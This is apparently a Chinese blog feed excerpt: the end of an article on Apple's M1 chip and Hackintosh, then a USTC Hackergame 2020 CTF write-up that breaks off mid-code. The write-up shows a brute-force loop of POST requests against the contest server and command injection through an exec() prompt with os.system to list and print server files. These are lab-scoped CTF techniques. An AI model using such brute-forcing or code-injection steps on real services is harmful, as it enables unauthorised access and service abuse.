上运行虚拟机是完全可行的。但是，苹果是否会选择开放虚拟化，又和苹果的目标用户战略、M1 本身的性能是相关的。</p>\n<h2>搭载了 M1 的 Mac 能否运行 PhotoShop？</h2>\n<p>这个问题的答案在发布会上有了明确的解答，我们完全无需猜测：「现在不行，不过明年就会有了」。</p>\n<p>在 WWDC 2020 上，库克就在 ARM DTK 上演示了玛雅的运行，但是对 Adobe Photoshop 却一笔带过、表示「仍在适配中」。而在这次 Apple Events 上，苹果软件部门的 SVP 克雷格·费德里吉是这么介绍的：</p>\n<blockquote>\n<p>And Adobe is bringing universal version of their Apps, staring with Lightroom next month, and other collection of apps including Photoshop early next year.</p>\n<p>而且 Adobe 也开始带来他们的通用应用，将从下个月的 Lightroom 开始，而包括 Photoshop 在内的其它应用（的 ARM 版本）则会在明年年初到来。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/7.jpg\" alt=\"7\" width=\"1280\" height=\"803\" class=\"lazy post-img\"></p>\n<p>那么，为什么大部分应用都可以很快地发布 Intel、ARM 通用版本，而 Adobe 全家桶却需要再等好几个月？因为 Adobe 从 2019 年开始大部分应用都高度依赖基于 Intel 特殊数学函数库 —— Intel Math Kernel Library（intel-mkl），以及其它一些 Intel 特殊指令集用于硬件加速（涉及到的有 MXMCore、FastCore、CameraRAW 等）。因此即使在搭载了同为 X86 的 AMD 处理器上安装黑苹果，使用 Photoshop 的某些功能也会导致闪退甚至 Kernel Panic；同理，AMD 黑苹果无法运行 MatLab，或者即使能够运行、运算速度也非常缓慢，也是由于缺乏 intel-mkl 导致的。搭载了 M1 芯片的 Mac 自然也无法调用 intel-mkl 库，因此 Adobe 需要几乎重写所有的功能实现，才能让他们的软件在 ARM Mac 上流畅运行。</p>\n<h2>如何评价率先搭载 M1 的三款 Mac？</h2>\n<p>在 Apple Events 上，苹果率先发布了三款搭载了 M1 的 Mac，其中搭载了 M1 的 MacBook Air 相比上一代搭载了 Intel i7 处理器的 MacBook Air（2020 年 3 月推出），CPU 性能提升了 3.5 倍、GPU 图形性能提升了 5 倍。但是，这是和哪一款 Intel i7 对比的呢？上市于 Q2’20 的 i7-1060NG7、Ice Lake、10nm、基础频率 1.20GHz、搭载的是 Iris Plus 核显、TDP 10W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/8.png\" alt=\"8\" width=\"982\" height=\"547\" class=\"lazy post-img\"></p>\n<p>那 Mac Mini 呢？苹果比表示搭载了 M1 的 Mac Mini 相比上一代搭载了 Intel 处理器的 Mac Mini，CPU 性能提升了 3 倍、GPU 图形性能提升了 6 倍。那么在苹果官网的脚注里写的是和哪一款 Mac Mini 进行的对比呢？对比的是于 2018 年发布的 Mac Mini，搭载了上市于 Q3’18 的 i3-8100B、Coffee Lake、14nm++、基础频率 3.6GHz（无睿频）、搭载的是臭名昭著的 UHD 630 核显，TDP 65W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/9.png\" alt=\"9\" width=\"993\" height=\"377\" class=\"lazy post-img\"></p>\n<p>苹果发布的第三款搭载 M1 的 Mac 是 MacBook Pro 13’，相比上一代搭载了 Intel i7 的 MacBook Pro 13’，CPU 性能提升 2.8 倍、GPU 图形性能提升了 5 倍，而这一性能提升是和 i7-8557U 对比出来的，上市于 Q3’19、Coffee Lake、14nm++、基础频率 1.7GHz、搭载 Iris Plus 645 核显、TDP 15W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/10.png\" alt=\"10\" width=\"1002\" height=\"544\" class=\"lazy post-img\"></p>\n<p>注意到没有，苹果在发布会上对比性能提升时，一直都使用的「best in class」（同类别）、「We have ever created」（我们制造过的）、「better than previous generation」（比上一代更好）的说辞。而当我们真正去注意苹果官网产品页面的脚注，才会发现苹果对比的产品并不是加强了 ML 的 Tiger Lake、并不是 Xe 核显或是 VEGA 显卡，而是 CoffeeLake 的降压 U 和孱弱的 Ice Lake、以及臭名昭著的 UHD 630、和上一代的 Iris Plus。</p>\n<p>而且，让我们再做一道数学题，如果 M1 比 i7-8557U（MBP 13’ 2019）快 2.8 倍、又比 Ice Lake（MBA 2020）快 3.5 倍，那么是不是可以说 i7-8557U 比 Ice Lake 的 i7-1067NG7 快 25% 呢？可以看出，苹果对比的显然是限制功耗和锁频后的性能，因此结论也就很明显了：ARM 凭借着高能耗比、低功耗，在轻薄本上大杀四方，吊打前款，但是绝对性能在普通 PC、笔记本上搭载的 Ice Lake 和 Tiger Lake 面前其实毫无优势、更不可能和 AMD 同台竞技。</p>\n<p>另外，M1 芯片为了追求超小体积和超低功耗，只在 SoC 中封装了两个 LPDDR4X 作为内存，因此只能提供最高 16G 的「DRAM」内存，这对上网本和办公白领来说绰绰有余，对「创作者」、「开发者」来说自然是远远不够的；被阉割的还有 Mac Mini 上的雷电接口，搭载 Intel 的 Mac Mini 有两个雷电控制器、而搭载 M1 的只有 SoC 里集成的一个，因此 ARM Mac Mini 只有两个雷电接口、而不是四个。</p>\n<p>综合来说，M1 的超低功耗、超高能耗比在轻薄本、上网本上绝对是不二选择，MBA 这样的目标用户更在乎发热和续航，而 M1 恰恰可以满足他们的需要；M1 所不能做的事情，如绝对性能不足、无法连接 eGPU、恰恰是上网本用户所不在意的。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/6.jpg\" alt=\"6\" width=\"1280\" height=\"718\" class=\"lazy post-img\"></p>\n<p>但是，苹果在没有电池的 Mac Mini、和在「面向创作者和开发者」的 MacBook Pro 13’ 上搭载孱弱的 M1，实在有点不可理喻、和一种自降身段的感觉。毕竟，Mac Mini 是时时刻刻需要插着电源的，而 MacBook Pro 13’ 的用户也不会抱着笔记本在户外使用 Xcode、Final Cut Pro X 和 Logic Pro，对吧？</p>\n<p>虽然我们现在看到 KOL、小编们普遍对 M1 称赞不已，但是可以预见当他们发现这次发布的三款 Mac 都没法安装 Windows、都暂时无法运行 Photoshop 后，对 ARM Mac 的评价也会逐渐转变风向的。</p>\n<h2>Apple ARM 芯片和 ARM Mac 的未来？</h2>\n<p>综合来说，我们在 M1 上看到了令人惊艳的超低功耗加超高能耗比；而在性能方面，对于一款 ARM 架构的处理器来说，「勉勉强强」能和 Tiger Lake「五五开」也已经是不小的成就了。在上网本、轻薄本级别的 MacBook Air 乃至日后可能重启的 MacBook 12’ Refresh 产品线上，M 系列处理器肯定是不二选择。</p>\n<p>与之对应的是「生产力 Mac」。MacBook Pro、iMac 的目标用户从事的工作大多为移动办公（MBP Only）、绘图、图像处理、音视频创作、影视制作、软件开发、轻度机器学习，而 Mac Pro、iMac Pro 的目标用户则大多从事大型影视剪辑、大型图像处理、大型数字音频制作、三维制作、大型机器学习等工作。而正如我在之前章节所说，让这类行业内的软件优化适配、使其能够发挥 ARM 的硬件的完整性能，还有非常漫长的一段路要走。而在这些行业中，自行组装 PC 固然可以弥补硬件性能上的差距、而在软件生态上 macOS 却是无出其右的，看看 Logic Pro、Final Cut Pro X 就知道了。苹果在未来很长一段时间内都会继续发布搭载 Intel 的 Mac。如果苹果一意孤行，急迫地在这类产品线强上 M 系列处理器，只会迫使这类目标用户转向 Windows 10 和 AMD 的怀抱。</p>\n<p>历史上，苹果的架构选择甚至还会受到苹果公司领导层决策的影响。1992 年苹果就在计划将 Macintosh System（Classic Mac OS）迁移到 X86 架构上，甚至开展了一项秘密计划「Star Trek」。而当更青睐 PowerPC 的苹果新任 CEO 走马上任以后，X86 架构迁移计划就被束之高阁，直到乔布斯重新回到苹果、WWDC 2005 宣布 Mac 将迁移到 Intel 处理器上。因此，也不排除存在这种可能：随着库克离任、苹果领导层变动、ARM 处理器不再向「高性能、密集计算」的方向突破，甚至可能苹果换了 CEO 后 Mac 将会搭载 AMD 处理器，但是这两种可能性显然不大。</p>\n<h2>黑苹果的未来？</h2>\n<p>作为一名黑苹果用户，M1 处理器的发布自然会引起对黑苹果未来的关注。正如我在「<a href=\"https://blog.skk.moe/post/history-osx86/#%E8%8B%B9%E6%9E%9C%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%BC%9A%E6%94%BE%E5%BC%83-Intel-%E7%9A%84-x86-%E6%9E%B6%E6%9E%84%EF%BC%9F\">黑苹果的未来</a>」一文中的「苹果什么时候会放弃 Intel 的 x86 架构？」章节中所说，过去 6 年之间每个 macOS 大版本都会兼容至少 7 年以前发布的设备。苹果的副总裁 John Ternus 在 Apple Events 中所说「This journey will take a couple of years to complete, and we have a long way to go」，预示着苹果在未来数年内都会继续发布搭载 Intel 处理器的 Mac。</p>\n<div class=\"license\">\n<div class=\"license-title\">谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/talk-about-arm-m1-mac/\">https://blog.skk.moe/post/talk-about-arm-m1-mac/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-11-11</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/talk-about-arm-m1-mac/"},{"title":"USTC Hackergame 2020（中科大信安赛）write up","date":"2020-11-06 22:00:00","description":"\n<p>作为一只 CS 零基础、信安零基础、CTF 零基础的菜狐狐，苏卡卡今年又来参加 USTC Hackergame 啦！由于一边做题一边总结思路（指写 Write Up），所以苏卡卡应该是第一个发布非官方的 USTC Hackergame 2020 Write Up 的吧（嘿嘿）。</p>\n<blockquote><p>题图来自 USTC Hackergame 2019「Happy LUG」</p></blockquote>\n<span></span><h2>签到题</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/1.png\" width=\"508\" height=\"417\" class=\"lazy post-img\"></p>\n<p>只要提取 1 个 flag 就好啦！可是，为什么这个反人类的 <code>form-control</code> 的步长竟然是 0.00001：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/2.png\" width=\"794\" height=\"327\" class=\"lazy post-img\"></p>\n<p>继续看下去会发现，用手是根本不可能拖到 1.00000 的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/25.png\" width=\"636\" height=\"277\" class=\"lazy post-img\"></p>\n<p>不管了，直接点击「提取」：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/3.png\" width=\"482\" height=\"393\" class=\"lazy post-img\"></p>\n<p>同时，发现地址栏里的 URL 变成了 <code>http://202.38.93.111:10000/?number=0.84608</code>。那就立刻访问 <code>http://202.38.93.111:10000/?number=1</code> 拿到 flag！</p>\n<blockquote><p>Google 从 Chrome 76 起开始推行 WHATWG URL 规范中的「<a href=\"https://url.spec.whatwg.org/#url-rendering-simplification\">Simplify non-human-readable or irrelevant components</a>」、即「简化非人类可读或不相关的组件」。不过 Chrome 85 起提供了「Always Show Full URLs」的选项，可以在地址栏上右键后从菜单中开启。</p></blockquote>\n<h2>猫咪问答++</h2>\n<blockquote><ol>\n<li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.<br>提示：学术上一般认为龙不属于哺乳动物。</li>\n<li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？<br>提示：咕咕咕，咕咕咕。</li>\n<li>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？<br>提示：活动记录会在哪里？</li>\n<li>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？<br>提示：建议身临其境。</li>\n<li>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？<br>提示：是一个非负整数。</li>\n</ol></blockquote>\n<p>其中，第二题、第三题、第五题的答案分别可以在下述 URL 中找到：</p>\n<ul>\n<li>\n<a href=\"https://tools.ietf.org/html/rfc1149\">RFC1149 - A Standard for the Transmission of IP Datagrams on Avian Carriers</a>：信鸽的典型 MTU 是 256 毫克</li>\n<li>\n<a href=\"https://news.ustclug.org/2019/09/2019-sfd-ustc/\">2019 软件自由日中国科大站 - USTC LUG</a>：开源游戏的名称是 Teeworlds、有 9 个字母</li>\n<li><a href=\"https://news.ustclug.org/2019/12/hackergame-2019/\">中国科学技术大学第六届信息安全大赛圆满结束 - USTC LUG</a></li>\n</ul>\n<p>至于第一题要搜索二十几种吉祥物、一不小心还会数错，第四题要去找卫星图像或者街景图，大尾巴狐狸太懒了、不想搜索了！有没有别的方法获取 flag？</p>\n<p>第一题给了 23 种编程语言、软件或组织：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-string\">\"Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce\"</span>.split(<span class=\"hljs-string\">'，'</span>).length<span class=\"hljs-comment\">// 23</span></code></pre>\n<p>至于图书馆前的地上停车位、总不可能超过 100 个吧？</p>\n<p>那么，写一个遍历跑第一题和第四题的答案，总会跑出 Flag 的！</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">1</span>; i &lt; <span class=\"hljs-number\">23</span>; i++) { <span class=\"hljs-comment\">// 至少有 1 种哺乳动物；既然提示了龙不是哺乳动物，那么肯定不会 23 种前部都是</span>  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> j = <span class=\"hljs-number\">0</span>; j &lt; <span class=\"hljs-number\">100</span>; j++) { <span class=\"hljs-comment\">// 一个停车位都没有的可能性不是没有，遍历时要考虑进去</span>    <span class=\"hljs-keyword\">const</span> formData = <span class=\"hljs-keyword\">new</span> FormData();    formData.append(<span class=\"hljs-string\">'q1'</span>, i);    formData.append(<span class=\"hljs-string\">'q2'</span>, <span class=\"hljs-number\">256</span>);    formData.append(<span class=\"hljs-string\">'q3'</span>, <span class=\"hljs-number\">9</span>);    formData.append(<span class=\"hljs-string\">'q4'</span>, j);    formData.append(<span class=\"hljs-string\">'q4'</span>, <span class=\"hljs-number\">17098</span>);    fetch(<span class=\"hljs-string\">'http://202.38.93.111:10001/'</span>, {      <span class=\"hljs-attr\">body</span>: formData,      <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>,    }).then(<span class=\"hljs-function\"><span class=\"hljs-params\">resp</span> =&gt;</span> resp.text()).then(<span class=\"hljs-function\"><span class=\"hljs-params\">text</span> =&gt;</span> {      <span class=\"hljs-keyword\">if</span> (!text.includes(<span class=\"hljs-string\">'没有全部答对，不能给你 flag'</span>)) {        <span class=\"hljs-built_in\">console</span>.log(i, j, text);      }    });  }}</code></pre>\n<p>果然，<del>通过对比赛平台的 CC 攻击</del>，很快就把第一题和第四题答案跑出来了：第一题的答案是 12、第四题的答案是 9。输入正确答案提交即可获取 flag。</p>\n<h2>2048</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/4.png\" width=\"680\" height=\"888\" class=\"lazy post-img\"></p>\n<p>毫无疑问，这道题如果真的玩到 2048 获取 Flag 是肯定可行的，但是我懒；同样的原因，我也不想对这个网站里每个 JS 都审计一次。既然如此，不如先随便玩玩，看看这道题的 Flag 大概会藏在哪里。</p>\n<p>随便乱敲方向键刻意使 Game Over，DevTools 截获了一个 HTTP 请求、是 <code>html_actuator.js</code> 第 164 行发起的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/5.png\" width=\"1862\" height=\"712\" class=\"lazy post-img\"></p>\n<p>现在我们直接审计 <code>html_actuator.js</code> 就好了，把发起 AJAX 请求的函数找出来：</p>\n<pre><code class=\"hljs js\">HTMLActuator.prototype.message = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">won</span>) </span>{  <span class=\"hljs-keyword\">var</span> type    = won ? <span class=\"hljs-string\">\"game-won\"</span> : <span class=\"hljs-string\">\"game-over\"</span>;  <span class=\"hljs-keyword\">var</span> message = won ? <span class=\"hljs-string\">\"FLXG 大成功！\"</span> : <span class=\"hljs-string\">\"FLXG 永不放弃！\"</span>;  <span class=\"hljs-keyword\">var</span> url;  <span class=\"hljs-keyword\">if</span> (won) {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span> + (<span class=\"hljs-string\">'b'</span>+<span class=\"hljs-string\">'a'</span>+ +<span class=\"hljs-string\">'a'</span>+<span class=\"hljs-string\">'a'</span>).toLowerCase();  } <span class=\"hljs-keyword\">else</span> {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span>;  }  <span class=\"hljs-keyword\">let</span> request = <span class=\"hljs-keyword\">new</span> XMLHttpRequest();  request.open(<span class=\"hljs-string\">'GET'</span>, url);  request.responseType = <span class=\"hljs-string\">'text'</span>;  request.onload = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>{    <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"game-message-extra\"</span>).innerHTML = request.response;  };  request.send();  <span class=\"hljs-built_in\">this</span>.messageContainer.classList.add(type);  <span class=\"hljs-built_in\">this</span>.messageContainer.getElementsByTagName(<span class=\"hljs-string\">\"p\"</span>)[<span class=\"hljs-number\">0</span>].textContent = message;  <span class=\"hljs-built_in\">this</span>.clearContainer(<span class=\"hljs-built_in\">this</span>.sharingContainer);  <span class=\"hljs-built_in\">this</span>.sharingContainer.appendChild(<span class=\"hljs-built_in\">this</span>.scoreTweetButton());};</code></pre>\n<p>看了代码就知道怎么获取 Flag 了，直接 GET <code>/getflxg?my_favorite_fruit=banana</code> 即可。</p>\n<blockquote><p>小彩蛋，在 JavaScript 中字符串类型 <code>String</code> 转换成数字类型 <code>Number</code> 时会得到 <code>NaN</code>，凑成了 <code>banana</code>。</p></blockquote>\n<h2>一闪而过的 Flag</h2>\n<blockquote>\n<p>…… <strong>程序每次运行时隐约可见黑色控制台上有 flag 一闪而过。</strong></p>\n<p>……</p>\n<p>而你作为一名新生，不由动了恻隐之心。望着诗人潇洒远去的背影，你可以赶在下午诗人回来之前，帮助这位可怜的人，用 flag 装满他的饭盒吗?</p>\n<p><a href=\"https://archive.org/details/untitled-01_exe\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>欺负苏卡卡用 macOS 不用 Windows，哼！苏卡卡才不会重启到 Windows 就为了看个 flag 呢，Parallels Desktop 启动！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/21.png\" width=\"1423\" height=\"781\" class=\"lazy post-img\"></p>\n<p>没有什么是截图解决不了的。。。啊，什么？还要区分 <code>i I 1 l</code>？<del>当然是猜 flag 啦</del></p>\n<p>小 Tip，打开 CMD、左上角图标右键、「默认值」，是可以设置「控制台窗口」默认字体和字号的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/22.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/23.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p>改了字体以后，这不就分得清清楚楚啦！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/24.png\" width=\"1067\" height=\"586\" class=\"lazy post-img\"></p>\n<h2>从零开始的记账工具人</h2>\n<blockquote>\n<p>如同往常一样，你的 npy 突然丢给你一个购物账单：“我今天买了几个小玩意，你能帮我算一下一共花了多少钱吗？”</p>\n<p>你心想：<del>又双叒叕要开始吃土了</del> 这不是很简单吗？电子表格里面一拖动就算出来了</p>\n<p>只不过拿到账单之后你才注意到，似乎是为了剁手时更加的安心，这次的账单上面的金额全使用了中文大写数字</p>\n<p><strong>注意：请将账单总金额保留小数点后两位，放在 <code>flag{}</code> 中提交，例如总金额为 123.45 元时，你需要提交 <code>flag{123.45}</code></strong></p>\n</blockquote>\n<p>这道题上来继续欺负苏卡卡没有在 macOS 上安装 Office，<del>大尾巴狐狸非常生气</del>。你看 npm 上这个能解析 <code>xlsx</code> 文件的 SheetJS、大写数字转小写的 nzh 还蛮好用的。Node.js 代码如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> XLSX = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'xlsx'</span>); <span class=\"hljs-comment\">// 解析 xlsx 用</span><span class=\"hljs-keyword\">const</span> NzhCN = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'nzh/cn'</span>); <span class=\"hljs-comment\">// 大写数字转小写</span><span class=\"hljs-keyword\">const</span> xlsx = XLSX.readFile(<span class=\"hljs-string\">'./bills.xlsx'</span>); <span class=\"hljs-comment\">// 当然你要先把 xlsx 文件下载下来</span><span class=\"hljs-keyword\">const</span> data = XLSX.utils.sheet_to_json(xlsx.Sheets[xlsx.SheetNames[<span class=\"hljs-number\">0</span>]]);<span class=\"hljs-keyword\">let</span> count = <span class=\"hljs-number\">0</span>;data.forEach(<span class=\"hljs-function\"><span class=\"hljs-params\">row</span> =&gt;</span> {  <span class=\"hljs-keyword\">const</span> moneyData = { <span class=\"hljs-attr\">yuan</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">jiao</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">fen</span>: <span class=\"hljs-number\">0</span> };  <span class=\"hljs-comment\">// nzh 不支持处理金额，需要自己实现一个</span>  <span class=\"hljs-keyword\">let</span> tmp;  [[<span class=\"hljs-string\">'元'</span>, <span class=\"hljs-string\">'yuan'</span>], [<span class=\"hljs-string\">'角'</span>, <span class=\"hljs-string\">'jiao'</span>], [<span class=\"hljs-string\">'分'</span>, <span class=\"hljs-string\">'fen'</span>]].forEach(<span class=\"hljs-function\">(<span class=\"hljs-params\">[i, dataKey]</span>) =&gt;</span> {    tmp = (tmp || row[<span class=\"hljs-string\">'单价'</span>]).split(i);    <span class=\"hljs-keyword\">if</span> (tmp.length === <span class=\"hljs-number\">1</span>) {      tmp = tmp[<span class=\"hljs-number\">0</span>]    } <span class=\"hljs-keyword\">else</span> {      moneyData[dataKey] = NzhCN.decodeB(tmp[<span class=\"hljs-number\">0</span>]);      tmp = tmp[<span class=\"hljs-number\">1</span>]    }  });  <span class=\"hljs-comment\">// 处理金额时，要小心浮点数大坑哟</span>  <span class=\"hljs-keyword\">const</span> value = moneyData.yuan * <span class=\"hljs-number\">100</span> + moneyData.jiao * <span class=\"hljs-number\">10</span> + moneyData.fen;  count = count + value * row[<span class=\"hljs-string\">'数量'</span>];});<span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">`flag{<span class=\"hljs-subst\">${(count<span class=\"hljs-regexp\">/100).toFixed(2)}}`); /</span><span class=\"hljs-regexp\">/ 直接打印 flag</span></span></span></code></pre>\n<h2>超简单的世界模拟器</h2>\n<blockquote>\n<p>……</p>\n<p>你的任务是在生命游戏的世界中，复现出蝴蝶扇动翅膀，引起大洋彼岸风暴的效应。</p>\n<p>通过改变左上角 15x15 的区域，在游戏演化 200 代之后，如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：</p>\n<p>“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/26.png\" width=\"919\" height=\"936\" class=\"lazy post-img\"></p>\n<p>在 Google 上搜索「生命游戏」，找到了一个知乎提问和 <a href=\"https://www.conwaylife.com/wiki/Main_Page\">Conway Life Game Wiki</a>。大概了解康威生命游戏是什么后就理解了题目的要求：要在 15x15 的范围内构建一个生命游戏图形、在演化到 200 代之后会清除两个种群。</p>\n<p>第一个 Payload 是一艘最简单的会向右平移「飞船」（这个图形在知乎或是 Life Game Wiki 上都可以被轻易找到），可以直接摧毁第一个种群：</p>\n<pre><code class=\"hljs plaintext\">00000110111101101100011</code></pre>\n<p>第二个 Payload 是我一不小心试出来的，由一个平移的「飞船」和一个沿着斜对角线行走的「滑翔者」共同组成，他们会「擦弹」引发「大爆炸」，在 80 代左右摧毁第一个种群、在 160 代左右摧毁第二个种群：</p>\n<pre><code class=\"hljs plaintext\">0000011011110110110001100001101011</code></pre>\n<h2>从零开始的火星文生活</h2>\n<blockquote>\n<p>……</p>\n<p>L 同学打开附件一看，傻眼了，全都是意义不明的汉字。机智的 L 同学想到 Q 同学平时喜欢使用 <strong>GBK 编码</strong>，也许是打开方式不对。结果用 GBK 打开却看到了一堆夹杂着日语和数字的<strong>火星文</strong>……</p>\n<p>L 同学彻底懵逼了，几经周折，TA 找到了科大最负盛名的火星文专家 (你)。依靠多年的字符编码解码的经验，你可以破译 Q 同学发来的火星文是什么意思吗？</p>\n<p>注：正确的 flag 全部由 <strong>ASCII</strong> 字符组成！</p>\n</blockquote>\n<p>这种 GBK、UTF-8 之间的火星文编码问题，直接给一个 Unix 下的 <strong>万能解法</strong>：</p>\n<pre><code class=\"hljs bash\">cat gibberish_message.txt | iconv -f utf8 -t gbk | iconv -f utf8 -t latin1 | iconv -f gbk -t utf8</code></pre>\n<p>剩下要做的，就是把全角转换成半角了。</p>\n<h2>自复读的复读机</h2>\n<blockquote>\n<p>能够复读其他程序输出的程序只是普通的复读机。</p>\n<p>顶尖的复读机还应该能复读出自己的源代码。</p>\n<p>什么是国际复读机啊（战术后仰）</p>\n<p>你现在需要编写两个只有一行 Python 代码的顶尖复读机：</p>\n<ul>\n<li>其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）</li>\n<li>另一个是输出代码本身的 sha256 哈希值，十六进制小写</li>\n</ul>\n<p>满足两个条件分别对应了两个 flag。</p>\n<p>快来开始你的复读吧~</p>\n</blockquote>\n<p>访问题目，输出的提示信息是：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec():</code></pre>\n<p>什么，可以 <code>exec()</code> 啊？那大尾巴狐狸直接干坏事了：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec(): import os; os.system(\"ls\")</code></pre>\n<p>发现目录下面有一个 <code>checker.py</code> 和一个 <code>runner.py</code>。接着用 <code>os.system(\"cat *.py\")</code> 获得题目源码：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-comment\"># checker.py</span><span class=\"hljs-keyword\">import</span> subprocess<span class=\"hljs-keyword\">import</span> hashlib<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:    code = <span class=\"hljs-built_in\">input</span>(<span class=\"hljs-string\">\"Your one line python code to exec(): \"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> code:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Code must not be empty\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    p = subprocess.run(        [<span class=\"hljs-string\">\"su\"</span>, <span class=\"hljs-string\">\"nobody\"</span>, <span class=\"hljs-string\">\"-s\"</span>, <span class=\"hljs-string\">\"/bin/bash\"</span>, <span class=\"hljs-string\">\"-c\"</span>, <span class=\"hljs-string\">\"/usr/local/bin/python3 /runner.py\"</span>],        <span class=\"hljs-built_in\">input</span>=code.encode(),        stdout=subprocess.PIPE,    )    <span class=\"hljs-keyword\">if</span> p.returncode != <span class=\"hljs-number\">0</span>:        <span class=\"hljs-built_in\">print</span>()        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code did not run successfully\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    output = p.stdout.decode()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(code))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Output of your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(output))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking reversed(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> code[::-<span class=\"hljs-number\">1</span>] == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag1\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking sha256(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> hashlib.sha256(code.encode()).hexdigest() == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag2\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span 